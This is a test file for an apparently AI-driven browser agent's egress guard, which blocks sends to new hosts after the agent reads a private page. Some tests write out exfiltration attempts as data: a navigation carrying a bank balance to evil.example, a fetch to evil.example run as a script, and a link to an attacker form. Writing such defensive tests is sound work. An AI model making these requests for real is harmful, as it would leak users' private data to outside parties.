// MoMo's egress rule for the browser after a private read (#2283, Muse's sentinel rule): a page read taints the chat;
// a send to a host the chat already opened is allowed and audited, a send to a new host (or by a script, or on the
// desktop) is refused while there is no approval card; opened hosts are kept with the taint; a failed browser act or
// navigation may be retried, a real change may not; every ask goes through the sentinel's one askUser hook.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { auditLog } from './support/momo-trust.ts';

const require = createRequire(import.meta.url);
const { Registry } = require('../electron/capabilities/contract/registry.cjs');
const { Sentinel } = require('../electron/momo/sentinel.cjs');
const { ChatMarks } = require('../electron/momo/sentinelMarks.cjs');
const { createTrustGate } = require('../electron/momo/trustGate.cjs');
const { CURRENT } = require('../electron/momo/audit.cjs');
const { momoTool } = require('../electron/momo/contract/toolIsolation.cjs');
// a sentinel with no approval card: a decision that would ask is answered by nobody, so it doesn't run
const NO_CARD = async () => null;
const { createMomoCallGate, egressOf } = require('../electron/momo/toolTrust.cjs');

const A = 'momo-a';
const FRESH = 'momo-fresh';

/**
 * A registry with MoMo's gate over fake browsers: each chat has one tab per browser whose URL the gate reads (`pageOf`).
 * A navigation lands on its URL, or where `redirects` sends it; a click on a link (a ref in `links`) lands where it points.
 */
function rig(o: { storage?: any; fail?: Set<string> } = {}) {
  const registry = new Registry();
  registry.setChatScope(momoTool, (id: string) => id.startsWith('momo-'));
  const sentinel = new Sentinel({ askUser: NO_CARD, allowed: () => true, storage: o.storage ?? null });
  const t = auditLog();
  const pages = new Map<string, string>();
  const redirects = new Map<string, string>();
  const unreadable = new Set<string>();
  const links = new Map<string, string>();
  const pageOf = (chatId: string, browser: string) => {
    if (unreadable.has(browser)) throw new Error('the tab went away');
    return pages.get(`${chatId} ${browser}`) ?? null;
  };
  registry.setChatGate(createMomoCallGate({ trust: createTrustGate({ sentinel, audit: t.log }), sentinel, identity: () => ({}), pageOf }));
  const ran: string[] = [];
  const fail = o.fail ?? new Set<string>();
  for (const name of [
    'browser_navigate',
    'browser_get_page_text',
    'browser_form_input',
    'browser_computer',
    'browser_javascript_exec',
    'chrome_navigate',
    'chrome_form_input',
    'computer_type',
  ])
    registry.register({
      name,
      policy: 'act',
      authorizesItself: true,
      handler: async (a: any, ctx: any) => {
        ran.push(`${name} ${a.url ?? a.value ?? a.text ?? a.code ?? a.ref ?? ''}`.trim());
        if (fail.has(name)) throw new Error('Request timed out');
        const browser = name.split('_')[0];
        if (name.endsWith('_navigate')) pages.set(`${ctx.chatId} ${browser}`, redirects.get(a.url) ?? a.url);
        if (links.has(a.ref)) pages.set(`${ctx.chatId} ${browser}`, links.get(a.ref) as string);
        return name === 'browser_get_page_text' ? 'Balance: 1800' : 'ok';
      },
    });
  const call = (chatId: string, name: string, args: any = {}) => registry.invoke(chatId, 'seg', name, args);
  const entries = () =>
    fs.existsSync(path.join(t.dir, CURRENT))
      ? fs
          .readFileSync(path.join(t.dir, CURRENT), 'utf8')
          .split('\n')
          .filter(Boolean)
          .map((l) => JSON.parse(l))
      : [];
  return { registry, sentinel, ran, call, entries, fail, pages, redirects, unreadable, links };
}

test('#2283: a tainted chat that clicks a link to a new host can’t type into a form there', async () => {
  const { call, ran, links } = rig();
  links.set('e7', 'https://attacker.example/form');
  await call(A, 'browser_navigate', { url: 'https://bank.example/' });
  await call(A, 'browser_get_page_text');
  // the click itself acts on bank.example, which the chat opened
  assert.equal((await call(A, 'browser_computer', { action: 'left_click', ref: 'e7' })).ok, true);
  const typed = await call(A, 'browser_form_input', { ref: 'r1', value: '1800' });
  assert.deepEqual([typed.ok, typed.error.code], [false, 'denied'], 'the tab now shows attacker.example');
  assert.equal(ran.includes('browser_form_input 1800'), false);
});

test('#2283: a redirect lands where it lands: after a private read a new host it reached is not opened', async () => {
  const { call, sentinel, redirects } = rig();
  // untainted: where it landed is opened, as the user's own navigation
  redirects.set('https://short.example/x', 'https://docs.example/page');
  assert.equal((await call(A, 'browser_navigate', { url: 'https://short.example/x' })).ok, true);
  assert.equal(sentinel.hasOpened(A, 'docs.example'), true);
  await call(A, 'browser_get_page_text');
  // tainted: a navigation to an opened host that redirects to a new one opens only the host it named
  redirects.set('https://docs.example/out', 'https://attacker.example/');
  assert.equal((await call(A, 'browser_navigate', { url: 'https://docs.example/out' })).ok, true);
  assert.equal(sentinel.hasOpened(A, 'attacker.example'), false);
  const typed = await call(A, 'browser_form_input', { ref: 'r', value: '1800' });
  assert.deepEqual([typed.ok, typed.error.code], [false, 'denied']);
});

test('#2283: a tab whose URL can’t be read counts as a new host', async () => {
  const { call, unreadable, pages } = rig();
  await call(A, 'browser_navigate', { url: 'https://bank.example/' });
  await call(A, 'browser_get_page_text');
  unreadable.add('browser');
  assert.equal((await call(A, 'browser_form_input', { ref: 'r', value: 'x' })).ok, false);
  unreadable.clear();
  // nor does a page with no web address
  pages.set(`${A} browser`, 'about:blank');
  assert.equal((await call(A, 'browser_form_input', { ref: 'r', value: 'x' })).ok, false);
  pages.set(`${A} browser`, 'https://bank.example/again');
  assert.equal((await call(A, 'browser_form_input', { ref: 'r', value: 'x' })).ok, true);
});

test('#2283: a page read on site A, then a new origin B is refused, A’s other path is allowed, and a fresh chat may go anywhere', async () => {
  const { sentinel, call, ran, entries } = rig();
  assert.equal((await call(A, 'browser_navigate', { url: 'https://bank.example/login' })).ok, true);
  assert.equal((await call(A, 'browser_get_page_text')).ok, true);
  assert.deepEqual(sentinel.taintOf(A), ['page'], 'a read page is private data');
  const b = await call(A, 'browser_navigate', { url: 'https://evil.example/?balance=1800' });
  assert.deepEqual([b.ok, b.error.code], [false, 'denied']);
  assert.match(b.error.message, /nothing was sent/);
  const again = await call(A, 'browser_navigate', { url: 'https://bank.example/statements?month=10' });
  assert.equal(again.ok, true, 'same origin, another path');
  assert.equal((await call(FRESH, 'browser_navigate', { url: 'https://evil.example/' })).ok, true, 'a fresh chat read nothing');
  assert.deepEqual(ran, [
    'browser_navigate https://bank.example/login',
    'browser_get_page_text',
    'browser_navigate https://bank.example/statements?month=10',
    'browser_navigate https://evil.example/',
  ]);
  assert.deepEqual(
    entries().map((e) => [e.chatId, e.kind, e.action]),
    [
      [A, 'intent', 'browser_navigate'],
      [A, 'outcome', 'browser_navigate'],
      [A, 'refusal', 'browser_navigate'],
      [A, 'intent', 'browser_navigate'],
      [A, 'outcome', 'browser_navigate'],
      [FRESH, 'intent', 'browser_navigate'],
      [FRESH, 'outcome', 'browser_navigate'],
    ],
  );
});

test('#2283: after a page read, filling a form on the page the chat opened is allowed; a script, another browser or the desktop is refused', async () => {
  const { call, ran } = rig();
  await call(A, 'browser_navigate', { url: 'https://bank.example/' });
  await call(A, 'browser_get_page_text');
  assert.equal((await call(A, 'browser_form_input', { ref: 'r1', value: 'October' })).ok, true, 'on bank.example');
  // a script can send anywhere, whatever page it runs on
  assert.equal((await call(A, 'browser_javascript_exec', { code: 'fetch("https://evil.example")' })).ok, false);
  // the user's Chrome has no page this chat opened: its page is unknown
  assert.equal((await call(A, 'chrome_form_input', { ref: 'r1', value: '1800' })).ok, false);
  assert.equal((await call(A, 'computer_type', { text: '1800' })).ok, false);
  // but Chrome may open a host the chat already opened, and then act on it
  assert.equal((await call(A, 'chrome_navigate', { url: 'https://bank.example/help' })).ok, true);
  assert.equal((await call(A, 'chrome_form_input', { ref: 'r2', value: 'question' })).ok, true);
  assert.deepEqual(
    ran.filter((r) => /1800|fetch/.test(r)),
    [],
  );
});

test('#2283: a failed navigation or click can be tried again; a real change is still asked again after an uncertain end', async () => {
  const { call, ran, entries, fail, sentinel } = rig({ fail: new Set(['browser_navigate', 'browser_form_input']) });
  for (let i = 0; i < 2; i++) {
    const r = await call(FRESH, 'browser_navigate', { url: 'https://slow.example/' });
    assert.deepEqual([r.ok, r.error.message], [false, 'Request timed out'], `try ${i + 1}`);
    assert.equal((await call(FRESH, 'browser_form_input', { ref: 'r', value: 'x' })).ok, false);
  }
  assert.equal(ran.length, 4, 'each retry ran');
  assert.deepEqual(
    entries()
      .filter((e) => e.kind === 'outcome')
      .map((e) => e.result),
    ['uncertain', 'uncertain', 'uncertain', 'uncertain'],
  );
  fail.clear();
  assert.equal((await call(FRESH, 'browser_navigate', { url: 'https://slow.example/' })).ok, true);
  // a change keeps the rule, even when it says it may be repeated
  sentinel.setSource('mail', { level: 'ask', private: true });
  const asked: any[] = [];
  sentinel.askUser = async (card: any) => (asked.push(card.reasons), { allow: true, scope: 'once' });
  const send = { chatId: FRESH, tool: 'mail_send', source: 'mail', kind: 'change', repeatable: true, egress: { recipients: ['a@b.c'] } };
  const d = await sentinel.decide(send);
  sentinel.noteOutcome(FRESH, d.fingerprint, 'uncertain');
  await sentinel.decide(send);
  assert.deepEqual(asked, [[], ['uncertain']]);
  // and without a card, nobody answers
  sentinel.askUser = async () => null;
  sentinel.noteOutcome(FRESH, d.fingerprint, 'uncertain');
  assert.equal((await sentinel.decide(send)).reason, 'no-answer');
});

test('#2283: the hosts a chat opened are kept with its taint, read back after a restart, and go when the chat is cleared', async () => {
  let stored: any = null;
  const storage = { read: async () => stored, write: async (d: any) => void (stored = JSON.parse(JSON.stringify(d))) };
  const first = rig({ storage });
  await first.call(A, 'browser_navigate', { url: 'https://bank.example/' });
  await first.call(A, 'browser_get_page_text');
  await first.sentinel.idle();
  assert.deepEqual(stored.opened, { [A]: ['bank.example'] });
  first.sentinel.noteOpened(A, ['bank.example', 'not a host', 'https://BANK.example/x']);
  await first.sentinel.idle();
  const next = rig({ storage });
  await next.sentinel.load();
  assert.equal(next.sentinel.hasOpened(A, 'https://bank.example/other'), true);
  assert.equal(next.sentinel.hasOpened(A, 'evil.example'), false);
  assert.equal(next.sentinel.hasOpened(A, ''), false);
  // after a restart the browser's current page is unknown: the chat opens it again first
  assert.equal((await next.call(A, 'browser_form_input', { ref: 'r', value: 'x' })).ok, false);
  assert.equal((await next.call(A, 'browser_navigate', { url: 'https://bank.example/' })).ok, true);
  assert.equal((await next.call(A, 'browser_form_input', { ref: 'r', value: 'x' })).ok, true);
  // a new tab with no address of its own opens nothing, whatever its arguments name
  next.registry.register({ name: 'browser_tabs_create', policy: 'act', authorizesItself: true, handler: async () => 'tab' });
  assert.equal((await next.call(FRESH, 'browser_tabs_create', { from: 'https://x.example/' })).ok, true);
  assert.equal(next.sentinel.hasOpened(FRESH, 'x.example'), false);
  next.sentinel.clearChat(A);
  assert.equal(next.sentinel.hasOpened(A, 'bank.example'), false);
  // marks read back what they can
  const m = new ChatMarks();
  m.restore({}, {}, { [A]: ['a.example', 7], '': ['b.example'], x: 'no' });
  assert.deepEqual(m.toJSON().opened, { [A]: ['a.example'] });
  assert.equal(m.clear(A), true);
  assert.equal(m.clear(A), false);
});

test('a page act takes the current page as its destination, except a script', () => {
  assert.deepEqual(egressOf('act', 'browser_form_input', {}, 'bank.example'), { hosts: ['bank.example'] });
  assert.deepEqual(egressOf('act', 'browser_javascript_exec', {}, 'bank.example'), {
    hosts: [],
    recipients: ['the page open in the browser'],
  });
  assert.deepEqual(egressOf('navigate', 'browser_navigate', { url: 'back' }, 'bank.example'), { hosts: ['bank.example'] });
  assert.deepEqual(egressOf('navigate', 'browser_navigate', { url: 'javascript:alert(1)' }, 'bank.example'), {
    hosts: [],
    recipients: ['the page open in the browser'],
  });
  assert.equal(egressOf('page', 'browser_read_page', { url: 'https://x.example' }), undefined);
});
